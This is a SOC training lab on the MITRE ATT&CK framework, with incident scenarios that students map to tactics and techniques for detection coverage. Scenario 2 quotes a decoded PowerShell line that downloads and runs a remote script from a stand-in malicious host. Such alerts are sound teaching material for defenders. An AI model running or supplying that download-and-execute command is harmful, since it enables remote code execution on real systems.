# Day#32- MITRE ATT&CK Framework Fundamentals

---

## 🎯 Objective

To understand the MITRE ATT&CK framework and learn how to map observed security incidents to adversary tactics, techniques, and procedures (TTPs) for better threat detection and response.

---

## 🖥️ Lab Setup

### **System Requirements**
- **Web Browser:** Chrome, Firefox, or Edge
- **Internet Connection:** Required for accessing MITRE ATT&CK resources

### **Resources Required**
- [MITRE ATT&CK Website](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [ATT&CK Matrix for Enterprise](https://attack.mitre.org/matrices/enterprise/)

---

## 📘 What is MITRE ATT&CK?

**MITRE ATT&CK** (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It serves as a foundation for threat modeling and methodology development in the cybersecurity community.

### **Purpose of ATT&CK**
- **Common Language:** Standardized way to describe adversary behavior
- **Threat Intelligence:** Understand how threat actors operate
- **Detection Engineering:** Build detections based on known techniques
- **Gap Analysis:** Identify coverage gaps in security controls
- **Incident Response:** Map observed activity to known attack patterns

---

## 🎯 ATT&CK Framework Structure

### **The Three Components**

```
TACTICS → TECHNIQUES → SUB-TECHNIQUES → PROCEDURES
```

### **1. Tactics (The "Why")**
The adversary's tactical goal - what they're trying to achieve.

| Tactic | Goal | Example |
|--------|------|---------|
| **Reconnaissance** | Gather information about target | Scan public websites, enumerate employees |
| **Resource Development** | Establish resources to support operations | Register domains, acquire infrastructure |
| **Initial Access** | Get into the network | Phishing, exploit public-facing application |
| **Execution** | Run malicious code | PowerShell, WMI, scheduled tasks |
| **Persistence** | Maintain foothold | Registry run keys, scheduled tasks, create accounts |
| **Privilege Escalation** | Gain higher-level permissions | Exploit vulnerabilities, abuse sudo, token manipulation |
| **Defense Evasion** | Avoid detection | Disable antivirus, obfuscate files, clear logs |
| **Credential Access** | Steal credentials | Credential dumping, keylogging, brute force |
| **Discovery** | Explore the environment | System/network discovery, account enumeration |
| **Lateral Movement** | Move through the network | RDP, PsExec, pass-the-hash |
| **Collection** | Gather data of interest | Screen capture, clipboard data, archive collected data |
| **Command and Control** | Communicate with compromised systems | Web protocols, DNS, encrypted channels |
| **Exfiltration** | Steal data | Exfil over C2, cloud storage, physical media |
| **Impact** | Manipulate, disrupt, or destroy | Data encryption (ransomware), defacement, DoS |

### **2. Techniques (The "How")**
The specific method used to achieve a tactic.

**Example:**
- **Tactic:** Credential Access
- **Technique:** T1110 - Brute Force
- **Technique:** T1003 - OS Credential Dumping
- **Technique:** T1056 - Input Capture (Keylogging)

### **3. Sub-Techniques (Variants)**
Specific variations of a technique.

**Example:**
- **Technique:** T1110 - Brute Force
  - **Sub-Technique:** T1110.001 - Password Guessing
  - **Sub-Technique:** T1110.002 - Password Cracking
  - **Sub-Technique:** T1110.003 - Password Spraying
  - **Sub-Technique:** T1110.004 - Credential Stuffing

### **4. Procedures**
Specific implementation by a threat actor or malware.

**Example:**
- APT28 uses Mimikatz (procedure) for OS Credential Dumping (T1003)

---

## 🔍 ATT&CK Matrix for Enterprise

The **Enterprise Matrix** covers techniques for Windows, Linux, macOS, and cloud environments.

### **Key Platforms**
- Windows
- Linux
- macOS
- Cloud (AWS, Azure, GCP, Office 365)
- Containers
- Network Devices

---

## 🛡️ How SOC Analysts Use ATT&CK

### **1. Incident Investigation**
Map observed indicators to ATT&CK techniques to understand:
- What the attacker is trying to accomplish
- What stage of the attack you're observing
- What other techniques might be used next

### **2. Detection Engineering**
Build detection rules based on ATT&CK techniques:
```
Alert: "T1110.001 - SSH Password Guessing Detected"
Logic: More than 10 failed SSH authentication attempts in 5 minutes
```

### **3. Threat Intelligence**
Track threat actor groups and their known TTPs:
- APT29 commonly uses techniques: T1566 (Phishing), T1059.001 (PowerShell), T1003 (Credential Dumping)

### **4. Coverage Assessment**
Identify detection gaps:
- "We have 0% detection coverage for T1547 (Boot/Logon Autostart Execution)"
- "We need to implement logging for T1053 (Scheduled Task/Job)"

---

## 🛠️ Lab Task: Mapping Real Incidents to MITRE ATT&CK

### **Scenario 1: SSH Brute Force Attack**

**Incident Details:**
```
Event: Multiple failed SSH login attempts
Source IP: 203.0.113.45 (External)
Target: 192.168.10.50 (Linux web server)
Failed Attempts: 247 attempts in 10 minutes
Usernames Tried: root, admin, ubuntu, test, user, postgres
Result: Login successful on attempt #248 with username "admin"
```

**Task:** Map this incident to MITRE ATT&CK

**Questions to Answer:**
1. What **Tactic(s)** are being used?
2. What **Technique ID(s)** apply?
3. What **Sub-Technique** is most accurate?
4. What **data sources** could detect this?

---

### **Scenario 2: PowerShell Malware Execution**

**Incident Details:**
```
Alert: Suspicious PowerShell Activity
Host: DESKTOP-WIN10-42
User: jsmith
Command: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand [Base64String]

Decoded Command:
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')

Observed Actions:
1. PowerShell downloaded remote script
2. Script created scheduled task "WindowsUpdate" pointing to C:\Temp\update.exe
3. Process enumeration commands executed (Get-Process, Get-Service)
4. Network connections to 185.220.101.45:4444
5. Attempted to read SAM registry hive
```

**Task:** Map this multi-stage attack to ATT&CK

**Questions to Answer:**
1. Identify ALL tactics used in this attack chain
2. List the specific technique IDs for each observed action
3. What techniques would you expect to see next?
4. Which MITRE detection data sources would catch each technique?

---

### **Scenario 3: Ransomware Attack Chain**

**Incident Timeline:**
```
T+0:00 - Phishing email with malicious attachment received by user
T+0:15 - User opens Excel file with macro
T+0:16 - Macro executes PowerShell command
T+0:17 - PowerShell downloads secondary payload from external domain
T+0:18 - Payload creates new user account "HelpDeskSupport"
T+0:20 - New account added to local Administrators group
T+0:25 - Malware disables Windows Defender
T+0:30 - Enumeration of network shares and active directory
T+1:00 - Lateral movement to file server via SMB
T+2:00 - Data collection and archiving
T+3:00 - File encryption begins (.locked extension)
T+3:30 - Ransom note dropped (README_DECRYPT.txt)
```

**Task:** Create a complete ATT&CK attack flow

**Deliverable:**
Create a table mapping each event to:
- Time
- Tactic
- Technique ID
- Technique Name
- Detection Data Source

---

### **Step 1: Explore the MITRE ATT&CK Matrix**

1. Go to [https://attack.mitre.org/](https://attack.mitre.org/)
2. Navigate to the **Enterprise Matrix**
3. Browse through each tactic column
4. Click on a technique (e.g., T1110 - Brute Force)
5. Review:
   - Description
   - Examples
   - Mitigations
   - Detection methods

### **Step 2: Use ATT&CK Navigator**

1. Go to [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
2. Create a new layer
3. For **Scenario 2**, highlight all relevant techniques
4. Color-code by tactic
5. Export the visualization

### **Step 3: Research Detection Methods**

For each technique identified in Scenario 2:
1. Find the **Detection** section on the ATT&CK page
2. Identify required **Data Sources** (e.g., Process Monitoring, Network Traffic, Windows Event Logs)
3. List specific **Event IDs** or **Log Sources** needed

### **Step 4: Build Detection Coverage Matrix**

Create a matrix showing:

| Technique ID | Technique Name | Current Detection | Data Source Needed | Coverage % |
|--------------|----------------|-------------------|-------------------|------------|
| T1059.001 | PowerShell | ✅ Yes - Event ID 4104 | PowerShell Logs | 100% |
| T1053.005 | Scheduled Task | ❌ No | Event ID 4698 | 0% |
| ... | ... | ... | ... | ... |

---

## 📸 Submission

Submit the following:

1. **Scenario 1 Mapping:**
   - Tactic(s), Technique ID(s), Sub-Technique(s)
   - Brief explanation of why each applies

2. **Scenario 2 Complete Analysis:**
   - Table with all observed actions mapped to ATT&CK
   - Predicted next techniques
   - Detection data sources for each technique

3. **Scenario 3 Attack Flow:**
   - Complete timeline with Tactic → Technique mapping
   - ATT&CK Navigator screenshot (optional)

4. **Detection Coverage Assessment:**
   - For Scenario 2, create a coverage matrix
   - Identify at least 2 gaps in detection capabilities

---

## 🎓 Learning Outcome

After completing this lab, you will:

- Understand the structure of the MITRE ATT&CK framework (Tactics, Techniques, Sub-Techniques)
- Map real-world security incidents to ATT&CK techniques
- Use ATT&CK for threat intelligence and adversary profiling
- Identify detection data sources for specific techniques
- Recognize attack progression through multiple tactics
- Use ATT&CK Navigator for visualization and communication
- Assess detection coverage gaps using the framework
- Apply standardized language when documenting incidents
- Understand how threat actors chain techniques together
- Build a foundation for detection engineering and threat hunting

---

## 💡 Key Takeaways

✅ **ATT&CK provides a common language** for describing adversary behavior across the industry
✅ **Tactics answer "why"**, techniques answer "how"
✅ **One incident can map to multiple techniques** - attacks are multi-stage
✅ **Detection requires the right data sources** - you can't detect what you don't log
✅ **ATT&CK helps prioritize** - focus on techniques commonly used by adversaries targeting your sector
✅ **Use ATT&CK for proactive defense** - identify gaps before attackers exploit them

---

## 📚 Additional Resources

- [MITRE ATT&CK Website](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Getting Started with ATT&CK](https://attack.mitre.org/resources/getting-started/)
- [ATT&CK for CTI (Cyber Threat Intelligence)](https://attack.mitre.org/resources/attackcon/)
- [Atomic Red Team - Testing ATT&CK Techniques](https://github.com/redcanaryco/atomic-red-team)
- [MITRE ATT&CK on GitHub](https://github.com/mitre-attack)
- [NIST Cybersecurity Framework Mapping to ATT&CK](https://csrc.nist.gov/publications/detail/white-paper/2021/10/13/nist-csf-pf-rof-cybersecurity-framework-profile/final)

---

## 🔗 Quick Reference: Common Technique IDs

| ID | Technique | Common in |
|----|-----------|-----------|
| T1566 | Phishing | Initial Access |
| T1059.001 | PowerShell | Execution |
| T1053.005 | Scheduled Task | Persistence |
| T1548 | Abuse Elevation Control | Privilege Escalation |
| T1562.001 | Disable AV | Defense Evasion |
| T1003.001 | LSASS Memory Dump | Credential Access |
| T1018 | Remote System Discovery | Discovery |
| T1021.001 | RDP | Lateral Movement |
| T1071.001 | Web Protocols (C2) | Command and Control |
| T1486 | Data Encrypted for Impact | Impact (Ransomware) |
